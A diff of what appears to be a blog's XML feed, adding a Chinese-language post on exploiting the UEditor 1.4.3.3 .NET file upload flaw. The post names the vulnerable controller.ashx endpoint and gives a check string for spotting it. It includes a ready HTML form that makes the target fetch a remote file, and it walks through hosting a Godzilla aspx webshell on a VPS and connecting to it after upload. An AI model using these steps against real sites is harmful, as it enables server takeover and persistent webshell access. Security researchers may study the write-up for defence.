@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>Ueditor_1.4.3.3_.NET版本文件上传漏洞利用</title>
+    <link href="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <url>/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
+    
+    <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>UEditor v1.4.3.3</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>访问路径目标路径&#x2F;Content&#x2F;ueditor&#x2F;net&#x2F;controller.ashx?action&#x3D;catchimage，但有时路径也会被修改，<strong>主要是看这个路径”&#x2F;controller.ashx?action&#x3D;”</strong></p><p><strong>若返回”参数错误:没有指定抓取源”，则说明存在该漏洞</strong></p><p><strong>实战案例：</strong></p><ol><li>先在编辑处发现了ueditor特征</li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png" class=""><ol start="2"><li>F12查看请求的接口</li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png" class=""><p>发现了这个接口，可以用来验证是否存在Ueditor1.4.3.3 .NET版本文件上传漏洞</p><ol start="3"><li>打开该接口路径，<strong>发现直接就是”&#x2F;controller.ashx?action&#x3D;”路径，而不是默认路径”&#x2F;Content&#x2F;ueditor&#x2F;net&#x2F;controller.ashx?action”，于是要根据实际情况去寻找该接口</strong></li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png" class=""><ol start="4"><li>验证漏洞是否存在，构造接口”&#x2F;controller.ashx?action&#x3D;catchimage”</li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png" class=""><p>验证成功，漏洞大概率存在</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>构造本地test.html文件，注意修改action为目标漏洞路径</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;form action=<span class="hljs-string">&quot; http://xxx.com/Content/ueditor/net/controller.ashx?action=catchimage&quot;</span> enctype=<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>  method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>  &lt;p&gt;shell addr:&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;source[]&quot;</span> /&gt;&lt;/p &gt;<br>  &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>使用哥斯拉制作aspx图片马，上传至VPS某个空目录，在该目录下，使用python开启临时http服务，使得能通过公网访问到该aspx木马</p><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png" class=""></li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png" class=""><ol start="3"><li>本地打开test.html文件，输入aspx木马的地址</li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png" class=""><ol start="4"><li>上传成功后，会返回木马地址，使用Webshell管理工具连接即可</li></ol><img src="/2024/07/27/Ueditor-1-4-3-3-NET%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png" class="">]]></content>
+    
+    
+    <categories>
+      
+      <category>WEB攻防</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Ueditor漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>重拾XXE漏洞</title>
     <link href="/2024/07/26/%E9%87%8D%E6%8B%BEXXE%E6%BC%8F%E6%B4%9E/"/>
     <url>/2024/07/26/%E9%87%8D%E6%8B%BEXXE%E6%BC%8F%E6%B4%9E/</url>
